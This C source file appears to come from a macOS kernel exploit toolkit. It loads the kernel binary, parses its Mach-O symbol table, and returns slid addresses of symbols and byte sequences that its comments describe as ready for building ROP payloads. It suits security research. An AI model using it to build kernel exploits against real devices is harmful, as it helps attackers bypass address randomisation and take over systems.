/* kernel_image.c
 * Brandon Azad
 *
 * Kernel parsing routines to find addresses of symbols and byte sequences.
 */

#include "kernel_image.h"

#include <fcntl.h>
#include <mach/mach.h>
#include <mach-o/nlist.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

#include "kernel_slide.h"

static struct mach_header_64 * kernel;
static size_t kernel_size;
static uint64_t kernel_base;
static struct symtab_command * kernel_symtab;

/* Load the kernel binary into the current process's memory and parse it to
   find the symbol table. */
int
load_kernel() {
	int fd = open("/System/Library/Kernels/kernel", O_RDONLY);
	if (fd == -1) {
		return 1;
	}
	struct stat st;
	int err = fstat(fd, &st);
	if (err) {
		close(fd);
		return 2;
	}
	kernel_size = st.st_size;
	kernel = mmap(NULL, kernel_size, PROT_READ, MAP_SHARED, fd, 0);
	close(fd);
	if (kernel == MAP_FAILED) {
		return 3;
	}
	struct load_command * lc = (struct load_command *)((uintptr_t)kernel + sizeof(*kernel));
	while ((uintptr_t)lc < (uintptr_t)kernel + (uintptr_t)kernel->sizeofcmds) {
		if (lc->cmd == LC_SYMTAB) {
			kernel_symtab = (struct symtab_command *)lc;
		} else if (lc->cmd == LC_SEGMENT_64) {
			struct segment_command_64 * sc = (struct segment_command_64 *)lc;
			if (strcmp(sc->segname, SEG_TEXT) == 0) {
				kernel_base = sc->vmaddr;
			}
		}
		lc = (struct load_command *)((uintptr_t)lc + lc->cmdsize);
	}
	if (kernel_symtab == NULL) {
		return 4;
	}
	if (kernel_base == 0) {
		return 5;
	}
	return 0;
}

/* Find the address of the given kernel symbol in kernel memory. The returned
   address factors in the kernel slide, so it can be used directly in building
   a ROP payload. */
int
find_kernel_symbol(const char * name, uint64_t * addr) {
	const char * base = (const char *)((uintptr_t)kernel + kernel_symtab->stroff);
	const char * str  = (const char *)((uintptr_t)base + 4);
	const char * end  = (const char *)((uintptr_t)base + kernel_symtab->strsize);
	uint64_t strx;
	for (;; ++str) {
		strx = (uintptr_t)str - (uintptr_t)base;
		const char * p = name;
		while (str < end && *p == *str && *p) {
			++p; ++str;
		}
		if (str < end && *p == *str) {
			break;
		}
		while (str < end && *str) {
			++str;
		}
		if (str == end) {
			return 1;
		}
	}
	struct nlist_64 * nl = (struct nlist_64 *) ((uintptr_t)kernel + kernel_symtab->symoff);
	for (uint32_t i = 0; i < kernel_symtab->nsyms; ++i) {
		if (nl[i].n_un.n_strx == strx) {
			if ((nl[i].n_type & N_TYPE) != N_SECT) {
				return 2;
			}
			*addr = nl[i].n_value + kernel_slide;
			return 0;
		}
	}
	return 3;
}

/* Find the address of the given byte sequence in kernel memory. The returned
   address factors in the kernel slide, so it can be used directly in building
   a ROP payload. */
int
find_kernel_bytes(const void * value, size_t size, uint64_t * addr) {
	const void * found = memmem(kernel, kernel_size, value, size);
	if (found == NULL) {
		return 1;
	}
	*addr = (uint64_t)found - (uint64_t)kernel + kernel_base + kernel_slide;
	return 0;
}
